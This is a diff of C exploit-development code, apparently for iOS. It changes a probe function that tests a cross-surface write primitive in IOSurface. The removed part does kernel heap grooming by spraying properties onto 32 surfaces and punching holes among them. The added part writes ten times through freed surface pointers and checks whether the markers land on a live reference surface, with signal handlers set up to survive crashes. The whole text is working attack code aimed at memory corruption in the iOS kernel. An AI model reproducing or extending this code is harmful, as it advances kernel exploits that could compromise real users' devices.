@@ -16199,15 +16199,6 @@ static void r395_probe(void) {
     sigaction(SIGBUS, &sa395, &old_bus395);
     sigaction(SIGSEGV, &sa395, &old_segv395);
 
-    /* ================================================================
-     * Phase 1: Kernel heap grooming — property-based zone filling
-     * Create 32 surfaces, set ~4KB properties on each to fill a kernel
-     * heap zone, free every other surface to create holes, then use
-     * cross-surface write to spray into the holes and detect if our
-     * data lands adjacent to a live surface's property storage.
-     * ================================================================ */
-    rlog("  Phase 1: Kernel heap grooming\n");
-
     int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
     CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
         &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
@@ -16224,107 +16215,56 @@ static void r395_probe(void) {
     CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
     CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
 
-#define R395_NSURFS 32
-    IOSurfaceRef surfs[R395_NSURFS];
-    uint32_t sids[R395_NSURFS];
-    uint8_t surfData[R395_NSURFS][512];
+    /* ================================================================
+     * Phase 1: Reproduce r394's pattern exactly, then test why batch
+     * freeing crashes. The r394 approach (free 1, spray 1, write) works.
+     * Test: how many can we do sequentially before iOS kills us?
+     * ================================================================ */
+    rlog("  Phase 1: Sequential cross-surface write (r394 pattern)\n");
 
-    for (int i = 0; i < R395_NSURFS; i++) {
-        surfs[i] = IOSurfaceCreate(props);
-        sids[i] = IOSurfaceGetID(surfs[i]);
-        memcpy(surfData[i], (void*)surfs[i], 512);
-    }
-    rlog("    Created %d surfaces (sids %u-%u)\n", R395_NSURFS, sids[0], sids[R395_NSURFS-1]);
+    IOSurfaceRef refSurf = IOSurfaceCreate(props);
+    uint32_t refSid = IOSurfaceGetID(refSurf);
+    uint8_t refData[512];
+    memcpy(refData, (void*)refSurf, 512);
 
-    /* Set 4KB property on each to allocate kernel heap blocks */
-    uint8_t *fillbuf = (uint8_t*)malloc(4096);
-    memset(fillbuf, 0x41, 4096);
-    CFDataRef filldata = CFDataCreate(NULL, fillbuf, 4096);
-    for (int i = 0; i < R395_NSURFS; i++) {
-        char key[32];
-        snprintf(key, sizeof(key), "Fill_%d", i);
-        CFStringRef cfkey = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
-        IOSurfaceSetValue(surfs[i], cfkey, filldata);
-        CFRelease(cfkey);
-    }
-    CFRelease(filldata);
-    free(fillbuf);
-    rlog("    Set 4KB 'Fill_N' on all %d surfaces\n", R395_NSURFS);
-
-    /* Free even-indexed surfaces to create holes */
-    uintptr_t freedAddrs[R395_NSURFS/2];
-    for (int i = 0; i < R395_NSURFS; i += 2) {
-        freedAddrs[i/2] = (uintptr_t)surfs[i];
-        clientRelease(surfs[i]);
-    }
-    rlog("    Freed %d even-indexed surfaces (created holes)\n", R395_NSURFS/2);
-
-    /* Use cross-surface write through each freed surface to spray unique markers
-     * into the kernel heap property storage of the wrong surface (odd neighbor).
-     * If hole reuse occurs, our property data should end up adjacent to the
-     * odd surfaces' live kernel objects. */
-    int spray_ok = 0;
-    for (int i = 0; i < R395_NSURFS; i += 2) {
-        int neighbor = i + 1;
-        if (neighbor >= R395_NSURFS) break;
-        /* Spray freed[i] with neighbor's data, write a marker */
-        memcpy((void*)freedAddrs[i/2], surfData[neighbor], 448);
+    int seq_ok = 0;
+    for (int trial = 0; trial < 10; trial++) {
+        IOSurfaceRef tgt = IOSurfaceCreate(props);
+        uint32_t tgtSid = IOSurfaceGetID(tgt);
+        uintptr_t tgtAddr = (uintptr_t)tgt;
+        clientRelease(tgt);
+        memcpy((void*)tgtAddr, refData, 448);
 
         g_r395_crashed = 0;
         if (sigsetjmp(g_r395_jmp, 1) == 0) {
-            int marker = 0xDEAD0000 | i;
-            CFNumberRef nmk = CFNumberCreate(NULL, kCFNumberIntType, &marker);
+            int mk = 0xAA000000 | trial;
+            CFNumberRef nmk = CFNumberCreate(NULL, kCFNumberIntType, &mk);
             char key[32];
-            snprintf(key, sizeof(key), "Spray_%d", i);
+            snprintf(key, sizeof(key), "Seq_%d", trial);
             CFStringRef cfkey = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
-            IOSurfaceSetValue(surfs[i], cfkey, nmk);
+            IOSurfaceSetValue(tgt, cfkey, nmk);
             CFRelease(nmk);
             CFRelease(cfkey);
-            spray_ok++;
-        } else {
-            rlog("    Spray through freed[%d] CRASHED: sig %d\n", i, g_r395_crashed);
-        }
-    }
-    rlog("    Cross-surface spray through %d freed slots: %d OK\n", R395_NSURFS/2, spray_ok);
 
-    /* Verify: check if markers landed on odd-indexed neighbors */
-    int found_on_neighbor = 0;
-    for (int i = 0; i < R395_NSURFS; i += 2) {
-        int neighbor = i + 1;
-        if (neighbor >= R395_NSURFS) break;
-        char key[32];
-        snprintf(key, sizeof(key), "Spray_%d", i);
-        CFStringRef cfkey = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
-
-        g_r395_crashed = 0;
-        if (sigsetjmp(g_r395_jmp, 1) == 0) {
-            CFTypeRef rv = IOSurfaceCopyValue(surfs[neighbor], cfkey);
+            /* Verify on ref surface */
+            CFStringRef cfkey2 = CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8);
+            CFTypeRef rv = IOSurfaceCopyValue(refSurf, cfkey2);
             if (rv) {
                 int v = 0;
                 CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
-                rlog("    surfs[%d] has Spray_%d: 0x%x\n", neighbor, i, v);
-                found_on_neighbor++;
+                rlog("    trial %d: ref has Seq_%d=0x%x (sid %u→%u) %s\n",
+                    trial, trial, v, tgtSid, refSid, v == mk ? "MATCH" : "MISMATCH");
                 CFRelease(rv);
+                seq_ok++;
+            } else {
+                rlog("    trial %d: ref does NOT have Seq_%d\n", trial, trial);
             }
+            CFRelease(cfkey2);
         } else {
-            rlog("    CopyValue surfs[%d] CRASHED: sig %d\n", neighbor, g_r395_crashed);
+            rlog("    trial %d CRASHED: sig %d\n", trial, g_r395_crashed);
         }
-        CFRelease(cfkey);
     }
-    rlog("    Markers found on neighbors: %d/%d\n", found_on_neighbor, R395_NSURFS/2);
-
-    /* Also check CopyAllValues on a neighbor to see total property set */
-    g_r395_crashed = 0;
-    if (sigsetjmp(g_r395_jmp, 1) == 0) {
-        CFDictionaryRef allvals = IOSurfaceCopyAllValues(surfs[1]);
-        if (allvals) {
-            CFIndex cnt = CFDictionaryGetCount(allvals);
-            rlog("    surfs[1] total properties: %ld\n", (long)cnt);
-            CFRelease(allvals);
-        }
-    } else {
-        rlog("    CopyAllValues CRASHED: sig %d\n", g_r395_crashed);
-    }
+    rlog("    Sequential cross-surface writes: %d/10 OK\n", seq_ok);
     fflush(stdout);
 
     /* ================================================================
@@ -16702,8 +16642,8 @@ static void r395_probe(void) {
     CFRelease(victimSurf);
     fflush(stdout);
 
-    /* Cleanup Phase 1 — release remaining odd surfaces */
-    for (int i = 1; i < R395_NSURFS; i += 2) CFRelease(surfs[i]);
+    /* Cleanup */
+    CFRelease(refSurf);
     CFRelease(smallSurf);
     CFRelease(largeSurf);
     CFRelease(purgTgt);
